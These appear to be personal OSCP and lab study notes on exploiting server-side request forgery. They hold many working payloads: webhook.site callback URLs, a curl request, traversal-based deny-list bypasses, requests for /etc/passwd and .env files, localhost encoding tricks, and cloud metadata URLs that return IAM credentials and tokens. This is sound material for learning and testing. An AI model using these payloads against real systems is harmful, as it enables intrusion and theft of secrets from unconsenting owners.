
SSRF occurs when a web application fetches a resource based on user-controlled input, potentially allowing access to internal services, local files, or external data exfiltration.

---

## **1. Look for SSRF input parameters (generalized)**

- SSRF can occur wherever user input controls a resource fetch. Examples of parameter names include:
    

`server=, url=, redirect=, fetch=, endpoint=, dst=, resource=, path=, api=, srv=`

- Also check:
    
    - Input fields in forms, where the value accepts either a URL or URI. For example: `<input type="radio" name="avatar" value="assets/avatars/1.png">` 
        
    - JSON POST data: `"endpoint": "http://..."`
        
    - Headers / cookies: `X-Forwarded-Host`, `X-Api-Endpoint`
        
- **OSCP Tip:** Always confirm the actual parameter the server uses — non-obvious names are common.
    

---

## **2. Example: Full URL in a parameter**

`https://website.thm/form?server=http://server.website.thm/store`

**Test exploitation (external SSRF):**

`https://website.thm/form?server=https://webhook.site/<your-id>`

**Notes:**

- Works for external SSRF.
    
- No `?x=` / `&x=` needed because the URL is complete and not appended automatically.
    

---

## **3. Example: Form Field**

`<input type="hidden" name="server" value="http://server.website.thm/store">`

**Test exploitation using curl:**

`curl -X POST -d "server=https://webhook.site/<your-id>" https://website.thm/form`

**Accessing normally Forbidden resources:**

Let us say for example you have an input that looks like this:

`<input type="radio" name="avatar" value="assets/avatars/1.png">`

Well, if you know there is a forbidden internal resource, you might be able to get the server to access it for you, by submitting the form with the input changed to the URI of that resource, for example:

`<input type="radio" name="avatar" value="private">`

Maybe "private" is blacklisted, on a deny list, you can bypass it using a directory traversal trick:

`<input type="radio" name="avatar" value="x/../private">` (try `x/../../private` etc, up to 8 levels)

**NOTE IF THE RESTRICTED DATA IS RETURNED, IT WILL BE RETURNED IN PLACE OF THE TYPICAL VALUE  - SO, FOR EXAMPLE, IN CASE OF THE ABOVE EXAMPLE, THE CONTENT MAY BE BASE64 ENCODED, LIKE SO: `<div class="avatar-image" style="background-image: url(data:image/png;base64,VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==)"></div>`**

**Notes:**

- Always use the correct parameter name (in this example `server`).

- **Make sure to use the correct HTTP method, e.g. `GET`, `POST` etc.**

- Hidden fields can be modified with Burp Suite, dev tools, or curl.
    
- Can be external or internal SSRF depending on server behavior.
    

---

## **4. Example: Partial URL / hostname-only / subdomain**

Original request:

`https://website.thm/form?server=api`

- The server internally expands `api` → `http://api.website.thm/...`
    

**Test exploitation:**

1. **If your URL has NO query string** (most Webhook.site URLs):
    

`https://website.thm/form?server=https://webhook.site/<id>?x=`

or

`https://website.thm/form?server=webhook.site/<id>?x=`

- `?x=` stops the server from appending its internal path.
    

2. **If your URL already has a query string:**
    

`https://website.thm/form?server=https://webhook.site/<id>?param=1&x=`

or

`https://website.thm/form?server=webhook.site/<id>?param=1&x=`

- `&x=` adds a dummy parameter to stop path concatenation.
    

3. **Internal SSRF / subdomain:**
    

`https://website.thm/form?server=subdomain.website.thm`

- Or short version:
    

`https://website.thm/form?server=subdomain`

- Then replace with your full external URL:
    

`https://website.thm/form?server=webhook.site/<id>?x=`

or

`https://website.thm/form?server=https://webhook.site/<id>?x=`

OR TRY BOTH OF THESE:

`https://website.thm/form?server=subdomain.website.thm`
`https://website.thm/form?server=subdomain`

Replacing `subdomain` with a subdomain you found during enumeration: [[Step 5. Subdomain Enumeration - OSINT]] && [[Step 6. Subdomain Enumeration - DNS Bruteforce (GoBuster)]]. You may be able to access a subdomain through the server, that you cannot access directly yourself.


---

## **5. Example: Only path provided**

`https://website.thm/form?dst=/forms/contact`

**Testing approach:**

- The server may combine the path with a base domain internally:
    
    `http://internal.website.thm + /forms/contact`
    
- To test SSRF or local file access:
    
    - **Path traversal / LFI attempts:**
        
        `dst=/../../../../etc/passwd dst=/../../../../var/www/html/config.php`
        
- Raw paths usually **cannot fetch external URLs directly**.
    

---

## **6. Identifying SSRF Type (External vs Internal)**

1. **External SSRF test:**
    

`server=http://<your-collaborator-url>`

- Request reaches your server → External SSRF
    

2. **Internal SSRF test:**
    

`server=http://127.0.0.1/` 
`server=http://10.0.0.1/` 
`server=http://server.internal.local/`

- Request succeeds → Internal SSRF
    

3. **Path append / subdomain check:**
    

- Append `/test` or check if the application merges paths automatically
    
- Use `?x=` or `&x=` to terminate unwanted path concatenation
    
- Controllable subdomain → Subdomain SSRF
    

---

## **7. Post-PoC Exploitation Workflow by SSRF Type**

**Summary:** PoC confirmed. Now the goal is to **leverage SSRF to access internal hosts, enumerate services, retrieve sensitive data, or pivot to exploitable endpoints**. Reverse shells are optional; retrieving flags or sensitive info is often sufficient for OSCP labs.

---

### **1. Internal SSRF**

- **Goal:** Identify internal hosts/services and retrieve sensitive data.
    
- **How to do it:**
    

**Step 1 – Internal Host Mapping:**

| Target Type                    | Example Payloads                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Purpose / Goal                                   |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| Localhost & bypass variants    | `server=http://127.0.0.1/`  <br>`server=http://localhost/`  <br>`server=http://0/`  <br>`server=http://0.0.0.0/`  <br>`server=http://0000/`  <br>`server=http://127.1/`  <br>`server=http://127.*.*.*/`  <br>`server=http://2130706433/`  <br>`server=http://017700000001/`  <br>`server=http://127.0.0.1.nip.io/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | Detect if deny-list filtering is bypassable      |
| Internal IP ranges             | `server=http://10.0.0.1/`  <br>`server=http://172.16.0.1/`  <br>`server=http://192.168.0.1/`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Discover internal subnets                        |
| Internal hostnames             | `server=http://admin.website.thm/`  <br>`server=http://internal-api/`<br>`server=admin.website.thm/`<br>`server=internal-api/`<br>`server=retricted_uri`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Identify DNS-resolvable internal hosts           |
| Common internal ports/services | `server=http://127.0.0.1:5984/_utils/` (CouchDB)  <br>`server=http://127.0.0.1:6379/` (Redis)  <br>`server=http://127.0.0.1:8080/admin` (Web apps)  <br>`server=http://127.0.0.1:8443/` (HTTPS web apps)  <br>`server=http://127.0.0.1:3306/` (MySQL)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Confirm which services are accessible internally |
| Cloud metadata services        | **AWS:** <br>`server=http://169.254.169.254/latest/meta-data/` <br>`server=http://169.254.169.254/latest/meta-data/iam/security-credentials/` <br>`server=http://169.254.169.254/latest/user-data` <br><br> **GCP (needs header `Metadata-Flavor: Google`):** <br>`server=http://169.254.169.254/computeMetadata/v1/` <br>`server=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` <br><br> **Azure (needs header `Metadata: true`):** <br>`server=http://169.254.169.254/metadata/instance?api-version=2021-01-01` <br>`server=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01` <br><br> **Bypass variants:** <br>`server=http://0xA9FEA9FE/` (hex) <br>`server=http://2852039166/` (decimal) <br>`server=http://0251.0376.0251.0376/` (octal dotted) | Extract cloud credentials and instance metadata  |

**Step 2 – Enumerate Sensitive Resources:**

- Fetch configuration or secret files:
    
    `server=http://127.0.0.1/var/www/html/config.php` 
    `server=http://127.0.0.1/.env` 
    `server=http://127.0.0.1/etc/passwd`
    
- Access cloud metadata endpoints:
    
    `server=http://169.254.169.254/latest/meta-data/`
    

_Goal:_ Retrieve flags, credentials, or secrets.

**Step 3 – Exploit Reachable Services:**

- Trigger vulnerable internal web apps, APIs, or dashboards.
    
- Use SSRF to chain into command injection or LFI/RCE if endpoints allow.
    

---

### **2. Subdomain / Path Append SSRF**

- **Goal:** Control subdomains or prevent automatic path concatenation.
    
- **How to do it:**
    

**Payloads:**

- Internal enumeration of subdomains:
    
    `server=subdomain` 
    `server=subdomain.website.thm`
    
- Prevent unwanted path append (if needed):
    
    `server=subdomain.website.thm?x=` 
    `server=subdomain.website.thm?param=1&x=`
    

_Goal:_ Pivot to internal subdomains, enumerate services, retrieve sensitive data.

---

### **3. Path-only SSRF / LFI**

- **Goal:** Exploit endpoints that only accept paths.
    
- **How to do it:**
    
    `dst=/../../../../etc/passwd` 
    `dst=/var/www/html/config.php` 
    `dst=/internal-api/config.json`
    
- Can chain with internal SSRF to access otherwise unreachable files or services.
    
- Reverse shell possible only if included resource executes code.
    

---

### **Key Post-PoC Principles**

1. **Map reachable hosts/services first** — know which IPs, hostnames, and ports are accessible.
    
2. **Enumerate sensitive data** — internal files, endpoints, cloud metadata, configs, and credentials.
    
3. **Identify exploitable endpoints** — internal APIs, admin panels, LFI/RCE.
    
4. **Pivot via SSRF if needed** — chain requests to access internal resources.
    
5. **Document everything** — parameter behavior, reachable hosts, open ports, payloads, and responses.
    
6. **Reverse shell is optional** — retrieving flags, secrets, or sensitive info is often enough.